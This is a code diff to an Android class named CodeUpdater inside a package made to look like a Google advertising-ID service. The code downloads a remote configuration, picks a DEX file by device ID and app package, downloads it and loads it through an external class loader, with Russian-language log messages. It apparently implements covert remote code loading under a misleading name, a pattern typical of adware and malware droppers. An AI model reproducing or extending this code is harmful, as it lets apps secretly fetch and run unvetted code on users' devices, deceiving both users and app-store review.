@@ -7,11 +7,13 @@ import android.support.v4.app.LoaderManager;
 import android.support.v4.content.AsyncTaskLoader;
 import android.support.v4.content.Loader;
 
+import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader.FilesLoader;
 import com.advertising_id_service.appclick.googleadvertisingidservice.DeviceInfo;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GoogleAdvertisingIdGetter;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
+import com.advertising_id_service.appclick.googleadvertisingidservice.SharedPreferencesServicer.SharedPreferencesServicer;
 
 import junit.runner.Version;
 
@@ -40,7 +42,8 @@ public class CodeUpdater {
                     public String loadInBackground() {
                             String res = null;
                             FilesLoader fl = new FilesLoader();
-                            String url_to_conf_file = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                            //String url_to_conf_file = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                            String url_to_conf_file = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                             String path = (url_to_conf_file == null) ? GlobalParameters.URL_TO_CONFIG_FILE : url_to_conf_file;
                             Logger.log("Грузим файл из:" + path);
                             fl.downloadFile(cnt, path, GlobalParameters.ConfigFilePathZip(cnt));
@@ -57,12 +60,14 @@ public class CodeUpdater {
                 try {
                     JSONObject rootObj = new JSONObject(json_str);
                     String path_to_conf_file = rootObj.getString(GlobalParameters.JSON_KEY_PATH_TO_CONF_FILE);
-                    String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                    //String path_to_conf_file_last = cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).getString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
+                    String path_to_conf_file_last = SharedPreferencesServicer.getPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, null);
                     if (!path_to_conf_file.equals(path_to_conf_file_last))
                     {
                         Logger.log("Надо загрузить конфигурационный файл из другого места:" + path_to_conf_file);
                         Logger.log("Вместо:" + path_to_conf_file_last);
-                        cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
+                        //cnt.getSharedPreferences(GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, Context.MODE_PRIVATE).edit().putString(GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file).apply();
+                        SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_PATH_TO_CONF_FILE, GlobalParameters.SPF_KEY_PATH_TO_CONF_FILE, path_to_conf_file);
                         new CodeUpdater().updateCode(cnt, lm, device_id);
                         return;
                     }
@@ -75,6 +80,7 @@ public class CodeUpdater {
                 String url = getUrlToLoadDexFile(cnt, device_id);
                 if (url != null) {
                     FilesLoader.downloadDexFile(cnt, url);
+                    ExternalLibServicer.clearDexClassLoader();
                 }
             }
 
@@ -171,11 +177,13 @@ public class CodeUpdater {
                                 }
                             }
                             //<---------------
-
                             if(isDeviceIDApprove && isApkPackageApprove && isVersion)
                             {
                                 Logger.log("Загружаем версию " + key);
                                 res = versionObj.getString(GlobalParameters.JSON_KEY_PATH);
+                                //Сохраняем HESH-код скачиваемого DEX-файла
+                                String hash_code = versionObj.getString(GlobalParameters.JSON_KEY_DEX_HASH);
+                                SharedPreferencesServicer.setPreferences(cnt, GlobalParameters.SPF_SESSION_DEX_HASH, GlobalParameters.SPF_KEY_DEX_HASH, hash_code);
                                 break;
                             }
                         }
